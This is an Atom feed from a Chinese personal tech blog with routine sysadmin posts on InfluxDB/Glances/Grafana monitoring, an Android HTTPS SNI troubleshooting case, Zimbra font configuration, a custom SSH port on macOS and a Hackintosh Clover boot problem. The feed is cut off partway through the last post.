<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[找节拍]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.inorz.net/"/>
  <updated>2016-05-22T16:16:54.000Z</updated>
  <id>http://www.inorz.net/</id>
  
  <author>
    <name><![CDATA[找节拍]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[InfluxDB、Glances和Grafana构建现代化监控系统]]></title>
    <link href="http://www.inorz.net/2016/05/22/InfluxDB-Grafana-Glances-monitor/"/>
    <id>http://www.inorz.net/2016/05/22/InfluxDB-Grafana-Glances-monitor/</id>
    <published>2016-05-22T15:55:48.000Z</published>
    <updated>2016-05-22T16:16:54.000Z</updated>
    <content type="html"><![CDATA[<p>今天的主角是InfluxDB、Glances、Grafana这三个工具，三个工作都非常强大。可以用于组件一个比较强大的分布式监控系统了，关键是文档也比较齐全。</p>
<p>简单介绍一下这三款软件：</p>
<ul>
<li><a href="https://influxdata.com" target="_blank" rel="external">InfluxDB</a>: InfluxDB 是一个开源，分布式，时间序列，事件，可度量和无外部依赖的数据库。</li>
<li><a href="http://nicolargo.github.io/glances/" target="_blank" rel="external">Glances</a>: glances 是一款用于 Linux、BSD 的开源命令行系统监视工具，它使用 Python 语言开发，能够监视 CPU、负载、内存、磁盘 I/O、网络流量、文件系统、系统温度等信息。本文介绍 glances 的使用方法和技巧，帮助 Linux 系统管理员了解掌握服务器性能。</li>
<li><a href="http://grafana.org/" target="_blank" rel="external">Grafana</a>: grafana 是一款采用go 语言编写的开源应用，主要用于大规模指标数据的可视化展现。</li>
</ul>
<p>下面我们说一下具体的部署过程：</p>
<a id="more"></a>
<h2 id="部署环境">部署环境</h2><ol>
<li>监控对象：MAC机器</li>
<li>监控平台：InfluxDB+Grafana，安装在一台CentOS机器上。(192.168.99.9)</li>
</ol>
<h2 id="部署过程">部署过程</h2><ol>
<li><p>InfluxDB(192.168.99.9)</p>
<ul>
<li><p>安装</p>
<ul>
<li><p>CentOS 6.2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载：</span></span><br><span class="line">wget https://dl.influxdata.com/influxdb/releases/influxdb-<span class="number">0.13</span>.<span class="number">0</span>.x86_64.rpm</span><br><span class="line"><span class="comment">#安装：</span></span><br><span class="line">sudo yum localinstall influxdb-<span class="number">0.13</span>.<span class="number">0</span>.x86_64.rpm</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他操作系统: <a href="https://influxdata.com/downloads/#influxdb" target="_blank" rel="external">详见官方文档</a></p>
</li>
</ul>
</li>
<li><p>配置和启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment"># 运行influxdb</span></span><br><span class="line">    sudo /etc/init.d/influxdb start</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建数据库</span></span><br><span class="line">    curl <span class="string">'http://192.168.8.172:8086/query?q=CREATE+DATABASE+"inorz_db_name"'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询已经创建的数据库</span></span><br><span class="line">    curl <span class="string">'http://localhost:8086/query?q=SHOW+DATABASES'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 也可以直接登录WEB界面进行操作和查询</span></span><br><span class="line">    <span class="comment"># 访问地址：http://192.168.99.9:8083</span></span><br><span class="line">    ``` </span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>. Glances</span><br><span class="line">    - 安装: 在被监控机器上安装，这里我们要监控的机器是一台MAC机器。</span><br><span class="line">        </span><br><span class="line">    ```bash</span><br><span class="line">    pip install glances --user</span><br><span class="line">    pip install influxdb --user</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置和启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/glances.conf</span><br><span class="line"><span class="comment"># 输入以下内容后保存退出</span></span><br><span class="line">host=<span class="number">192.168</span>.<span class="number">99.9</span></span><br><span class="line">port=<span class="number">8086</span></span><br><span class="line">ser=root</span><br><span class="line">password=root</span><br><span class="line">db=inorz_db_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">glances --export-influxdb -C /etc/glances.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果需要后台运行，挂掉又可自动拉启。可以用supervisor来托管服务</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果客户端和监控端之间防火墙已经配置互通了的话，这回数据应该是可以正常发送到influxdb去了的。可以通过以下命令来查询有没有指标入库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://192.168.99.9:8086/query?q=SHOW+MEASUREMENTS&amp;db=glances'</span></span><br><span class="line"><span class="comment"># 反馈来的是一串json</span></span><br><span class="line">&#123;<span class="string">"results"</span>:[&#123;<span class="string">"series"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"measurements"</span>,<span class="string">"columns"</span>:[<span class="string">"name"</span>],<span class="string">"values"</span>:[[<span class="string">"cpu"</span>],[<span class="string">"diskio"</span>],[<span class="string">"fs"</span>],[<span class="string">"load"</span>],[<span class="string">"mem"</span>],[<span class="string">"memswap"</span>],[<span class="string">"network"</span>],[<span class="string">"percpu"</span>],[<span class="string">"processcount"</span>],[<span class="string">"system"</span>]]&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<ol>
<li><p>Grafana(192.168.99.9)</p>
<ul>
<li><p>安装</p>
<ul>
<li><p>CentOS 6.2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载：</span></span><br><span class="line">wget https://grafanarel.s3.amazonaws.com/builds/grafana-<span class="number">3.0</span>.<span class="number">2</span>-<span class="number">1463383025</span>.linux-x64.tar.gz</span><br><span class="line"><span class="comment"># 解压并启动</span></span><br><span class="line">tar xf grafana-<span class="number">3.0</span>.<span class="number">2</span>-<span class="number">1463383025</span>.linux-x64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> grafana-<span class="number">3.0</span>.<span class="number">2</span>-<span class="number">1463383025</span>/bin/</span><br><span class="line">./grafana-server</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他操作系统: <a href="http://grafana.org/download/" target="_blank" rel="external">详见官方文档</a></p>
</li>
</ul>
<ul>
<li><p>配置</p>
<ul>
<li>直接在浏览器上进行配置：<a href="http://192.168.99.9:3000" target="_blank" rel="external">http://192.168.99.9:3000</a><ul>
<li>默认账密为admin,admin</li>
</ul>
</li>
<li><p>添加数据源<br>  <img src="http://inorz.net/image/grafana-add-data-influxdb.png" alt="grafana-add-data-influxdb">￼</p>
</li>
<li><p>添加Graph<br><img src="http://inorz.net/image/grafana_add_graph.png" alt="grafana_add_graph">￼</p>
</li>
<li><p>填入查询语句（可以到influxdb的WEB页面操作查询，语法和SQL差不多，非常简单）。这里我们填入查询复杂信息的语句。<br><img src="http://inorz.net/image/grafana_add_graph_edit.png" alt="grafana_add_graph_edit">￼</p>
</li>
</ul>
</li>
<li><p>效果图<br> 下面是我自己简单配置的一个监控图形，有兴趣的可以自己发挥。<br><img src="http://inorz.net/image/grafana_dashboards.png" alt="grafana_dashboards">￼</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="FAQ">FAQ</h2><ol>
<li>连接不上数据库，访问页面超时。首先检查一下安装过程以及配置，启动时是否有报错，另外看防火墙是否配置正确。<h2 id="其他">其他</h2></li>
<li>以上为个人的一个安装和配置过程，如有不对，请多多指正。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[InfluxDB、Glances和Grafana构建现代化监控系统]]>
    
    </summary>
    
      <category term="Glances" scheme="http://www.inorz.net/tags/Glances/"/>
    
      <category term="Grafana" scheme="http://www.inorz.net/tags/Grafana/"/>
    
      <category term="InfluxDB" scheme="http://www.inorz.net/tags/InfluxDB/"/>
    
      <category term="MAC" scheme="http://www.inorz.net/tags/MAC/"/>
    
      <category term="监控" scheme="http://www.inorz.net/tags/%E7%9B%91%E6%8E%A7/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记录一次android上https无法正常访问]]></title>
    <link href="http://www.inorz.net/2016/04/13/notes-android-https-error/"/>
    <id>http://www.inorz.net/2016/04/13/notes-android-https-error/</id>
    <published>2016-04-12T16:55:48.000Z</published>
    <updated>2016-04-12T17:00:46.000Z</updated>
    <content type="html"><![CDATA[<p>有同鞋反馈过来说，A域名通过Https去访问，完全无法建立连接。用B域名则没有任何问题。于是排除了代码这块的问题。<br>A域名和B域名，在浏览器上打开，则是完全没问题的。于是在小猜会不会是代码有问题。<br>然后就开始一系列的排查过程。<br>期间大神也过来帮忙一起排查。</p>
<a id="more"></a>
<h2 id="排查过程">排查过程</h2><ol>
<li><p>在自己的Mac下用了以下命令去测试连接A.test.domain.com，发现请求异常。无法建议连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect A.test.domain.com:<span class="number">443</span></span><br><span class="line">openssl s_client -connect A.test.domain.com:<span class="number">443</span> -tls1</span><br><span class="line">openssl s_client -connect A.test.domain.com:<span class="number">443</span> -ssl3</span><br><span class="line">openssl s_client -connect A.test.domain.com:<span class="number">443</span> -debug</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 返回都是</span></span><br><span class="line">CONNECTED(<span class="number">00000003</span>)</span><br><span class="line">write:errno=<span class="number">54</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>同样的命令，去请求B.test.domain.com，则没有任何问题。</p>
</li>
<li>手机端请求异常的时候进行了抓包。发现连三次握手都没办法正常进行。</li>
<li>开始对比两个域名之间的不同地方。<ul>
<li>A域名和B域名的证书是在两个地方申请的，一个是沃通，一个是StartSSL<ul>
<li>联系了沃通，对方技术反馈说通过<a href="https://wosign.ssllabs.com/index.html" target="_blank" rel="external">【沃通提供的测试系统】</a>，确定我们证书没有问题。包括证书链什么的都是正常。</li>
</ul>
</li>
<li>A域名和B域名的证书链不一样<ul>
<li>尝试了在沃通官网上找对应的根证书追加到A域名证书里，也是无果。</li>
</ul>
</li>
<li>A域名和B域名的Nginx版本不一样<ul>
<li>A机器用了openresty，B机用了最新的nginx</li>
<li>编译参数部分不一样</li>
<li>ldd nginx，发现两台机器也是一样的。</li>
</ul>
</li>
<li>A域名和B域名对应的机器不一样</li>
<li>A域名和B域名长得不一样…</li>
<li>…</li>
</ul>
</li>
<li>开始思考人生</li>
<li>开始反过来测试：<ul>
<li>把A机的域名配置和证书拉到B机，重启nginx。用openssl命令连接，居然可以正常访问。排除证书问题。</li>
<li>定位到可能是A机这边的问题。<ul>
<li>A机yum重新安装nginx：不行。</li>
<li>在A机重新编译nginx 1.4.4：不行。</li>
<li>直接把B机的nginx拉过去用：不行。</li>
</ul>
</li>
<li>在A机上用以前旧的nginx新开了一个1443的端口，指定A的域名。测试，可以连接。<ul>
<li>把旧的nginx还原之前旧的配置，发现又不能连接了。</li>
<li>大神怀疑配置有问题。又开始了各种测试。</li>
<li>最终发现是“有问题”的nginx下配置了多个ssl站点。</li>
<li>把另外一些多配的ssl站点配置移走后，nginx reload后发现A站点的Https域名可以正常访问了。</li>
</ul>
</li>
</ul>
</li>
<li>想到之前大神处理过SVN多ssl站点的问题。但最终是因为svn客户端1.6即之后的版本都默认支持<a href="https://en.wikipedia.org/wiki/Server_Name_Indication" target="_blank" rel="external">SNI特性</a>解决了。</li>
<li>在自己电脑上和手机上用openssl命令去连接失败，本地的Openssl版本是0.9.8的，手机的应该同样是旧版本。不支持SNI特性。openssl 1.0之后才会默认支持SNI特性。所以会连接失败。</li>
</ol>
<h2 id="解决方案">解决方案</h2><ol>
<li>手机端升级openssl，明显不太现实。</li>
<li>服务端这边只开启这一个域名为https，这样也不太现实。</li>
<li>android这边修改代码去实现。因为A证书之前在手机浏览器上访问是正常的。<ul>
<li>有两个相关的参考地址：<ul>
<li><a href="http://developer.android.com/training/articles/security-ssl.html" target="_blank" rel="external">http://developer.android.com/training/articles/security-ssl.html</a></li>
<li><a href="http://blog.dev001.net/post/67082904181/android-using-sni-and-tlsv12-with-apache" target="_blank" rel="external">http://blog.dev001.net/post/67082904181/android-using-sni-and-tlsv12-with-apache</a></li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="后记">后记</h2><ol>
<li>其实一开始沃通的技术发过来的测试站点上，有列出部分终端不能支持。并且也标识低版本不支持SNI。当时没仔细从这里入手，导致这里瞎测试了一段时间。</li>
<li>配置https的域名，需要在配置配上TLSv1，目前很多旧的手机还是只支持到v1的。否则会遇到和我一样的问题。</li>
<li>希望大家不要和我踩同样的坑</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[记录一次android上https无法正常访问]]>
    
    </summary>
    
      <category term="android" scheme="http://www.inorz.net/tags/android/"/>
    
      <category term="https" scheme="http://www.inorz.net/tags/https/"/>
    
      <category term="nginx" scheme="http://www.inorz.net/tags/nginx/"/>
    
      <category term="openssl" scheme="http://www.inorz.net/tags/openssl/"/>
    
      <category term="sni" scheme="http://www.inorz.net/tags/sni/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[zimbra添加微软雅黑字体]]></title>
    <link href="http://www.inorz.net/2016/04/11/zimbra-add-msyh/"/>
    <id>http://www.inorz.net/2016/04/11/zimbra-add-msyh/</id>
    <published>2016-04-11T15:20:48.000Z</published>
    <updated>2016-04-11T15:49:41.000Z</updated>
    <content type="html"><![CDATA[<p>很多同鞋都习惯了在zimbra上面使用雅黑字体来写邮件<br>最近把zimbra从8.0.5升级到了8.6.0后，没留意又覆盖回去了。<br>在这里做个记录</p>
<a id="more"></a>
<h2 id="配置原理">配置原理</h2><p>ZWC控制资源文件（properties文件）来实现国际化下的字体列表。在JAVA架构的系统下，通过资源文件来实现国际化是常用的技术，ZWC也不例外。</p>
<blockquote>
<p>经过搜索，ZWC中控制国际化下的字体列表的资源文件是:<br><code>zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg.properties</code><br>按照Java的规则，中文简体对应的资源文件应该是:<br><code>zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties</code></p>
</blockquote>
<ul>
<li>配置文件的写法大概是：<ul>
<li>可以向列表中加入任意多的字体数量。</li>
<li>要添加一个新的字体，首先要添加一个键名类似fontFamilyBase{number}.display的条目和一个键名类似fontFamilyBase{number}.css的条目，分别表示字体显示名称和内部名称。</li>
<li>对于国际化环境而言，则应使用键名分别为fontFamilyIntl{number}.display和fontFamilyIntl{number}.css的条目。</li>
<li>这里的{number}是一个阿拉伯数字，从1开始，新建时应比当前最大的数字大1。要结束这些列表，将最后一个条目的值设为“###”。</li>
</ul>
</li>
</ul>
<h2 id="配置过程">配置过程</h2><p>上面说了一通，其实修改方法比较简单，就修改两个地方即可：</p>
<ol>
<li><p>修改配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties /data/backup/</span><br><span class="line">vim zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties</span><br><span class="line"><span class="comment"># 找到fontFamilyIntl列表中第一个值为“###”的条目。根据不同的软件版本，那个&#123;number&#125;可能不同，在7.0上是4（即前面有3个字体）。</span></span><br><span class="line"><span class="comment"># 修改fontFamilyIntl4值。可按情况修改</span></span><br><span class="line"><span class="comment"># 微软雅黑转换为Unicode后是 \u5fae\u8f6f\u96c5\u9ed1</span></span><br><span class="line">fontFamilyIntl4.display = \u5fae\u8f6f\u96c5\u9ed1</span><br><span class="line">fontFamilyIntl4.css = \u5fae\u8f6f\u96c5\u9ed1, msyh</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存文件后重启Zimbra服务。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmcontrol restart</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="注意事项">注意事项</h2><ol>
<li>上面修改后的字体，需要客户端本地有对应的字体才能够正常使用。</li>
<li>windows平台: win7之后基本都自带微软雅黑了，应该不成问题。</li>
<li>MAC平台: mac用户的话就需要自己安装微软雅黑了。不过相信一般mac用户都用自带的邮件app的多些。也不是问题。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[zimbra添加微软雅黑字体]]>
    
    </summary>
    
      <category term="msyh" scheme="http://www.inorz.net/tags/msyh/"/>
    
      <category term="zimbra" scheme="http://www.inorz.net/tags/zimbra/"/>
    
      <category term="字体" scheme="http://www.inorz.net/tags/%E5%AD%97%E4%BD%93/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MAC开机启动ssh，并指定端口]]></title>
    <link href="http://www.inorz.net/2016/04/10/mac-startup-ssh/"/>
    <id>http://www.inorz.net/2016/04/10/mac-startup-ssh/</id>
    <published>2016-04-10T04:35:48.000Z</published>
    <updated>2016-04-10T05:08:05.000Z</updated>
    <content type="html"><![CDATA[<p>MAC开机启用SSH，比较简单。<br>偏好设置-共享-选中远程登录就可以了。</p>
<p>但是想要指定端口去启用就比较恶心了。<br>网上搜了一圈后，可以按以下的方式去指定端口配置。</p>
<a id="more"></a>
<h2 id="【系统环境】">【系统环境】</h2><p>OS: 10.11.4</p>
<h2 id="【配置过程】">【配置过程】</h2><ol>
<li>因为10.11开启了SIP，所以不能直接修改/System/下的文件。</li>
<li><p>把下面配置文件配置到用户级目录下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/Library/LaunchDaemons/</span><br><span class="line">sudo cp /System/Library/LaunchDaemons/ssh.plist ~/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件<code>vi ~/Library/LaunchDaemons/ssh.plist</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="doctype">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">plist</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Enabled<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>com.openssh.sshd.xxxxx（随便起个名字，目的是不被共享设置里面的开关影响到）<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Program<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/libexec/sshd-keygen-wrapper<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/sbin/sshd<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>-i<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Sockets<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">key</span>&gt;</span>Listeners<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">key</span>&gt;</span>SockServiceName<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">string</span>&gt;</span>SSH端口<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">key</span>&gt;</span>Bonjour<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">string</span>&gt;</span>ssh<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">string</span>&gt;</span>sftp-ssh<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>inetdCompatibility<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">key</span>&gt;</span>Wait<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">false</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">key</span>&gt;</span>Instances<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">integer</span>&gt;</span>42<span class="tag">&lt;/<span class="title">integer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>StandardErrorPath<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>/dev/null<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>SHAuthorizationRight<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>system.preferences<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>POSIXSpawnType<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>Interactive<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>重新载入配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl unload ~/Library/LaunchDaemons/ssh.plist</span><br><span class="line">sudo launchctl load -w ~/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以用telnet或是lsof来检查一下修改并启用的端口有没有开起来。或是直接ssh连一下测试即可。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[MAC开机启动ssh，并指定端口]]>
    
    </summary>
    
      <category term="MAC" scheme="http://www.inorz.net/tags/MAC/"/>
    
      <category term="ssh" scheme="http://www.inorz.net/tags/ssh/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[黑苹果Clover无法引导安装镜像，反复重启]]></title>
    <link href="http://www.inorz.net/2016/03/24/black-apple-clover-error/"/>
    <id>http://www.inorz.net/2016/03/24/black-apple-clover-error/</id>
    <published>2016-03-24T03:15:48.000Z</published>
    <updated>2016-04-01T07:12:13.000Z</updated>
    <content type="html"><![CDATA[<h2 id="背景">背景</h2><ul>
<li>最近准备测试一下黑苹果用来做IOS调试机器的可行性，于是在一台主机上安装了黑苹果，然后在安装过程中，遇到Clover无法引导安装镜像，反复重启。</li>
</ul>
<a id="more"></a>
<h2 id="排查过程">排查过程</h2><ol>
<li>一开始以为是主板或BIOS不行，反复换了不少镜像，包括各种懒人版。</li>
<li>然后发现所有镜像均是同一症状。反复重启。</li>
<li>开始怀疑和思考人生</li>
<li>最后翻了一下Clover的配置文件和官方文档，发现是可以配置内存位置的。</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">key</span>&gt;</span>Memory<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">key</span>&gt;</span>Channels<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="title">integer</span>&gt;</span> OR <span class="tag">&lt;<span class="title">string</span>&gt;</span>1<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">key</span>&gt;</span>SlotCount<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">integer</span>&gt;</span>24<span class="tag">&lt;/<span class="title">integer</span>&gt;</span> OR <span class="tag">&lt;<span class="title">string</span>&gt;</span>4<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">key</span>&gt;</span>Modules<span class="tag">&lt;/<span 